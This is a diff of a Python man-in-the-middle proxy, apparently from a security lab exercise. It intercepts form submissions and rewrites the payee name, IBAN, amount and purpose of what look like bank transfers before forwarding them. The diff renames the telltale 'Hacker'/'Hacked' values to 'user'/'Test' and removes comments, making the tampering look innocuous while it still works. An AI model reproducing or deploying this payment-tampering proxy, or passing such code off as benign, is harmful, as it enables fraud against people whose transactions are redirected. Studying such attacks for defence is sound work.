@@ -5,7 +5,6 @@ import urllib.request
 class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     
     def do_GET(self):
-        # Request an Server senden
         req = urllib.request.urlopen(self.path)
         self.send_response(req.getcode())
         self.end_headers()
@@ -16,24 +15,23 @@ class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         length = int(self.headers['Content-Length'])
         payload = self.rfile.read(length)
 
-         # Payload umwandeln
         payload = urllib.parse.parse_qs(payload)
-        print(payload) # testen welche payload geschickt
+        print(payload)
 
         # payload maniplulieren
-        payload[b'name'] = [b'Hacker'] # "b" - String lateral um binäre Daten zu repräsentaieren 
+        payload[b'name'] = [b'user'] # "b" - String lateral um binäre Daten zu repräsentaieren 
         payload[b'iban'] = [b'DE1324567890135792468']
         payload[b'amount'] = [b'499']
-        payload[b'purpose'] = [b'Hacked']
-        print(payload) #manipulierte payload
+        payload[b'purpose'] = [b'Test']
+        print(payload)
 
         # payload wieder in bytes umwandeln
         payload = urllib.parse.urlencode(payload, doseq=True).encode()
         
-        # content-length updaten um den Fehler password gleicher Länge zu vermieden
+        # content-length updaten
         self.headers['Content-Length'] = str(len(payload))
 
-         # manipulierte Request wieder an Server schicken
+         # manipulierte Request
         req = urllib.request.Request(self.path, data=payload, headers=self.headers, method="POST")
         res = urllib.request.urlopen(req)
 
@@ -41,7 +39,7 @@ class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         self.send_response(res.getcode())
         self.end_headers()
         self.wfile.write(res.read())
-
+        
 # Start the server
 try:
     socketserver.TCPServer(('', 8080), MyHTTPRequestHandler).serve_forever()
